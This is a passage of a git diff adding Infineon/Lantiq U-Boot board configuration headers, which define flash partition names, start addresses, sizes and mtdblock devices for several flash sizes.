+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x002C0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0x6980000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x06C40000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x400000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x0703FFFF
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock4"
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x07040000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x10000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x0704FFFF
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock5"
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x07080000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x40000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x070BFFFF
+  #define IFX_CFG_FLASH_DECT_CFG_MTDBLOCK_NAME       "/dev/mtdblock6"
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x07FFFFFF
+#elif (IFX_CONFIG_FLASH_SIZE == 512)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x000C0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00040000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x000C0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x10000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x007FF3FF
+  
+ 
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 1024)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x000C0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+   #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00100000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00200000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00400000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0x08000000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x08000000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x100000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x081FFFFF
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock4"
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x08200000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x10000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x082fffff
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock5"
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x08300000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x100000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x083fffff
+  #define IFX_CFG_FLASH_DECT_CFG_MTDBLOCK_NAME       "/dev/mtdblock6"
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x08400000
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#endif /*CONFIG_FIRMWARE_IN_ROOTFS*/
+
+
+#endif /*CONFIG_BOOT_FROM_SPI*/
+
+
+/* End of Board specific configurations
+ *-----------------------------------------------------------------------
+ */
+
+/*************************************************************************/
diff --git a/include/vr9_cfg.h b/include/vr9_cfg.h
new file mode 100644
--- /dev/null
+++ b/include/vr9_cfg.h
@@ -0,0 +1,1460 @@
+/* ============================================================================
+ * Copyright (C) 2003[- 2004] ? Infineon Technologies AG.
+ *
+ * All rights reserved.
+ * ============================================================================
+ *
+ * ============================================================================
+ *
+ * This document contains proprietary information belonging to Infineon
+ * Technologies AG. Passing on and copying of this document, and communication
+ * of its contents is not permitted without prior written authorisation.
+ *
+ * ============================================================================
+ *
+ * File Name: ifx_cfg.h
+ * Author : Mars Lin (mars.lin@infineon.com)
+ * Date:
+ *
+ * ===========================================================================
+ *
+ * Project:
+ * Block:
+ *
+ * ===========================================================================
+ * Contents:  This file contains the data structures and definitions used
+ *        by the core iptables and the sip alg modules.
+ * ===========================================================================
+ * References:
+ */
+
+/*
+ * This file contains the configuration parameters for the IFX board.
+ */
+
+
+/*-----------------------------------------------------------------------
+ * Board specific configurations
+ */
+#if defined(CONFIG_BOOT_FROM_NOR) || defined(CONFIG_BOOT_FROM_UART)
+
+#ifdef CONFIG_NOR_FLASH_2M
+#define IFX_CONFIG_FLASH_SIZE 2
+#elif CONFIG_NOR_FLASH_4M
+#define IFX_CONFIG_FLASH_SIZE 4
+#elif CONFIG_NOR_FLASH_8M
+#define IFX_CONFIG_FLASH_SIZE 8
+#endif
+
+#ifndef IFX_CONFIG_FLASH_SIZE
+#define IFX_CONFIG_FLASH_SIZE 4
+#endif
+
+#ifdef CONFIG_FIRMWARE_IN_ROOTFS
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0xB0020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0xB01FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0xB01FB200
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0xB01FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0xB01FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0xB01FFDFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME        "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR        0xB01FFE00
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE              0x0200
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR          0xB01FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0xB01FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0xB0020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME          "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR          0xB03F6DFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME            "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR            0xB03ECE00
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                  0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR              0xB03FCDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME             "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR             0xB03FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                   0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR               0xB03FFDFF
+
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME         "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR         0xB03FFE00
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE               0x0200
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR           0xB03FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0xB03FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "total_part=2\0"
+
+#ifdef CONFIG_OVERLAY
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_OVERLAY_IMAGE_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "data_block7=" IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"        
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "data_block6=" IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME "\0"    \
+        "total_db=7\0"
+#endif
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0xB0020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+#ifdef CONFIG_OVERLAY
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB078FFFF
+#else
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB07DFFFF
+#endif
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+	
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_BLOCK_NAME          "overlay"
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_START_ADDR          0xB0790000
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_SIZE                0x50000
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_END_ADDR            0xB07DFFFF
+	
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0xB07E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0xB07EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0xB07F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0xB07F0FFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0xB07F1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0xB07F1FFF
+  
+  #define IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME	      "calibration"
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_START_ADDR	      0xB07F2000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_SIZE		          0x1000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_END_ADDR		      0xB07F2FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                          0xB07FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#else /*Not defined CONFIG_FIRMWARE_IN_ROOTFS*/
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "part2_begin=0xB00A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0xB0020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0xB00A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0xB01FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0xB01FAE00
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0xB01FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0xB01FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0xB01FFDFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME        "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR        0xB01FFE00
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE              0x0200
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR          0xB01FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0xB01FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "part2_begin=0xB00A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME        "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR        0xB0020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE              0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME     "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0xB00A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB03EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0xB03EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0xB03FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME             "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR             0xB03FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                   0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR               0xB03FEFFF
+
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME         "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0xB03FF000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x400
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0xB03FF3FF
+
+
+  #define IFX_CFG_FLASH_END_ADDR                         0xB03FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
